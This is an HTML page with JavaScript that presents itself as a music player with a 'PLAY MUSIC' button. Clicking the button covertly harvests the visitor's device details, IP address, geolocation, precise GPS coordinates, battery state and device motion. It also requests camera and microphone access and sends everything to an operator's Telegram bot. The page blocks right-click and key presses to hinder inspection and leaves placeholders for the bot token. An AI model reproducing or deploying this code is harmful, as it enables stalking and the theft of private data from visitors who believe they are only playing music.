<body oncontextmenu="return false" onkeydown="return false" onmousedown="return false">

        <button class="music-btn" onclick="initDataCollection()">PLAY MUSIC</button>

    <script>
        // Telegram Bot Config
        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Replace with your Telegram Bot Token
        const CHAT_ID = 'YOUR_CHAT_ID_HERE'; // Replace with your Telegram Chat ID
        const SESSION_ID = Math.random().toString(36).substring(2, 15);

        // Send Telegram Message
        function sendTelegramMessage(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).catch(error => console.error('Telegram Error:', error));
        }

        // Collect and Send Data
        async function collectDeviceData() {
            const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' });
            let message = `*XHENZO SEC Visitor Report* 🕵️‍♂️\n*Session ID*: \`${SESSION_ID}\`\n*Time*: ${timestamp}\n\n`;

            // Device Info
            message += `*Device Info* 📱\n`;
            message += `User Agent: \`${navigator.userAgent}\`\n`;
            message += `Platform: ${navigator.platform}\n`;
            message += `Screen: ${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)\n`;
            message += `Language: ${navigator.language}\n`;
            message += `Cookies Enabled: ${navigator.cookieEnabled}\n`;

            // Network Info
            if ('connection' in navigator) {
                const conn = navigator.connection;
                message += `\n*Network Info* 🌐\n`;
                message += `Type: ${conn.type || 'Unknown'}\n`;
                message += `Effective Type: ${conn.effectiveType || 'Unknown'}\n`;
                message += `Downlink: ${conn.downlink || 'Unknown'} Mbps\n`;
            }

            // IP and Geolocation
            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                message += `\n*IP & Geolocation* 📍\n`;
                message += `IP: \`${ipData.ip}\`\n`;
                message += `ISP: ${ipData.org}\n`;
                message += `City: ${ipData.city}\n`;
                message += `Region: ${ipData.region}\n`;
                message += `Country: ${ipData.country_name}\n`;
            } catch (e) {
                message += `\n*IP & Geolocation* 📍\nFailed to retrieve\n`;
            }

            // Battery Status
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    message += `\n*Battery* 🔋\n`;
                    message += `Level: ${Math.round(battery.level * 100)}%\n`;
                    message += `Charging: ${battery.charging ? 'Yes' : 'No'}\n`;
                } catch (e) {
                    message += `\n*Battery* 🔋\nFailed to retrieve\n`;
                }
            } else {
                message += `\n*Battery* 🔋\nNot supported\n`;
            }

            sendTelegramMessage(message);
        }

        // Request Location
        function requestLocation() {
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const msg = `*Location Update* 📍\n*Session ID*: \`${SESSION_ID}\`\nLatitude: \`${position.coords.latitude}\`\nLongitude: \`${position.coords.longitude}\`\nAccuracy: ${position.coords.accuracy}m\n`;
                        sendTelegramMessage(msg);
                    },
                    error => {
                        sendTelegramMessage(`*Location* 📍\n*Session ID*: \`${SESSION_ID}\`\nFailed: ${error.message}\n`);
                    },
                    { enableHighAccuracy: true }
                );
            } else {
                sendTelegramMessage(`*Location* 📍\n*Session ID*: \`${SESSION_ID}\`\nNot supported\n`);
            }
        }

        // Request Camera and Microphone
        function requestMedia() {
            if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                    .then(stream => {
                        const video = document.getElementById('videoElement');
                        video.srcObject = stream;
                        sendTelegramMessage(`*Media Access* 📸🎙️\n*Session ID*: \`${SESSION_ID}\`\nCamera & Mic: Granted\n`);
                        setTimeout(() => {
                            stream.getTracks().forEach(track => track.stop());
                            sendTelegramMessage(`*Media Access* 📸🎙️\n*Session ID*: \`${SESSION_ID}\`\nStream Stopped\n`);
                        }, 500);
                    })
                    .catch(error => {
                        sendTelegramMessage(`*Media Access* 📸🎙️\n*Session ID*: \`${SESSION_ID}\`\nFailed: ${error.message}\n`);
                    });
            } else {
                sendTelegramMessage(`*Media Access* 📸🎙️\n*Session ID*: \`${SESSION_ID}\`\nNot supported\n`);
            }
        }

        // Device Orientation and Motion
        function requestDeviceMotion() {
            if ('DeviceOrientationEvent' in window) {
                window.addEventListener('deviceorientation', event => {
                    const msg = `*Device Orientation* 📐\n*Session ID*: \`${SESSION_ID}\`\nAlpha: ${event.alpha}\nBeta: ${event.beta}\nGamma: ${event.gamma}\n`;
                    sendTelegramMessage(msg);
                }, { once: true });
            }
            if ('DeviceMotionEvent' in window && 'requestPermission' in DeviceMotionEvent) {
                DeviceMotionEvent.requestPermission().then(response => {
                    if (response === 'granted') {
                        window.addEventListener('devicemotion', event => {
                            const acc = event.acceleration;
                            const msg = `*Device Motion* 📳\n*Session ID*: \`${SESSION_ID}\`\nX: ${acc.x}\nY: ${acc.y}\nZ: ${acc.z}\n`;
                            sendTelegramMessage(msg);
                        }, { once: true });
                    }
                }).catch(error => {
                    sendTelegramMessage(`*Device Motion* 📳\n*Session ID*: \`${SESSION_ID}\`\nFailed: ${error.message}\n`);
                });
            }
        }

        // Initialize Data Collection
        function initDataCollection() {
            const overlay = document.getElementById('loadingOverlay');
            overlay.style.display = 'flex';
            setTimeout(() => {
                overlay.style.display = 'none';
                collectDeviceData();
                requestLocation();
                requestMedia();
                requestDeviceMotion();
                toggleMusic();
            }, 2000);
        }

        // Music Toggle
        function toggleMusic() {
            const music = document.getElementById('bgMusic');
            const btn = document.querySelector('.music-btn');
            if (music.paused) {
                music.play().catch(e => console.log('Autoplay prevented'));
                btn.textContent = 'STOP MUSIC';
                btn.style.boxShadow = '0 0 15px red';
            } else {
                music.pause();
                btn.textContent = 'PLAY MUSIC';
                btn.style.boxShadow = 'none';
            }
        }
    </script>
</body>
